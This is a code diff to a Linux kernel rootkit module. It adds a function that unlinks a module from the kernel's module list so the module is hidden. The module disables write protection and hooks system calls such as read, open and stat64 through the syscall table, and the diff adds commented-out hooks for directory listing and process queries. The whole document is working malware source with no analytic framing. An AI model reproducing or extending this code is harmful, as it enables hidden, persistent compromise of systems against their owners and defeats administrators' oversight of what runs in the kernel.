@@ -5,6 +5,7 @@
 
 unsigned long **sys_call_table;
 //static unsigned long irq_flags;
+struct list_head * module_list_head = NULL;
 long clone_pid = 0;
 long clone_flag = 0;
 long clone_count = 0;
@@ -17,6 +18,39 @@ long vfork_count = 0;
 long vfork_spid = 0;
 long vfork_lastpid = 0;
 long process_count = 0;
+
+void
+del_lkm(const char *name) {
+	struct module * pmod;
+	struct list_head *plist;
+	//struct list_head *plisthead;
+
+	if(module_list_head == NULL) {
+		module_list_head = &__this_module.list;
+	}
+
+	plist = module_list_head;
+
+	while (plist) {
+		pmod = list_entry(plist, struct module, list);
+		if (!strcmp(name, pmod->name)) {
+			if (module_list_head == plist) {
+				module_list_head = module_list_head->prev;
+			}
+
+			plist->next->prev = plist->prev;
+			plist->prev->next = plist->next;
+
+			break;
+		}
+
+		plist = plist->prev;
+
+		if (plist == module_list_head) {
+			break;
+		}
+	}
+}
 
 /**
  *  sys_read - 3 - fs/read_write.c
@@ -543,11 +577,8 @@ ThisInit(void) {
         DLog("get sys_call_table failure!");
         return -1;
     }
-
     // local_irq_save(irq_flags);
-
     disable_write_protection();
-
     RT_SYSCALL_REPLACE(read); //3
     RT_SYSCALL_REPLACE(open); //5    
     RT_SYSCALL_REPLACE(chdir); //12
@@ -568,6 +599,9 @@ ThisInit(void) {
     RT_SYSCALL_REPLACE(stat64); //195
     RT_SYSCALL_REPLACE(lstat64); //196
 #endif
+    //    RT_SYSCALL_REPLACE(getdents64); //220
+    //    RT_SYSCALL_REPLACE(gettid); //224
+    //    RT_SYSCALL_REPLACE(sched_getaffinity); //242  
     enable_write_protection();
     //  local_irq_restore(irq_flags);
     return 0;
@@ -576,9 +610,7 @@ ThisInit(void) {
 static void __exit
 ThisExit(void) {
     //local_irq_save(irq_flags);
-
     disable_write_protection();
-
     RT_SYSCALL_RESTORE(read); //3
     RT_SYSCALL_RESTORE(open); //5   
     RT_SYSCALL_RESTORE(chdir); //12
@@ -594,15 +626,15 @@ ThisExit(void) {
     RT_SYSCALL_RESTORE(sched_getparam); //155
     RT_SYSCALL_RESTORE(sched_getscheduler); //157
     RT_SYSCALL_RESTORE(sched_rr_get_interval); //161
-    //RT_SYSCALL_RESTORE_JMP(vfork); //190
-    
+    //RT_SYSCALL_RESTORE_JMP(vfork); //190   
 #if BITS_PER_LONG == 32
     RT_SYSCALL_RESTORE(stat64); //195
     RT_SYSCALL_RESTORE(lstat64); //196
 #endif
-    
+    //    RT_SYSCALL_RESTORE(getdents64); //220
+    //    RT_SYSCALL_RESTORE(gettid); //224
+    //    RT_SYSCALL_RESTORE(sched_getaffinity); //242    
     enable_write_protection();
-
     //  local_irq_restore(irq_flags);
     DLog("rootkit exit");
 }
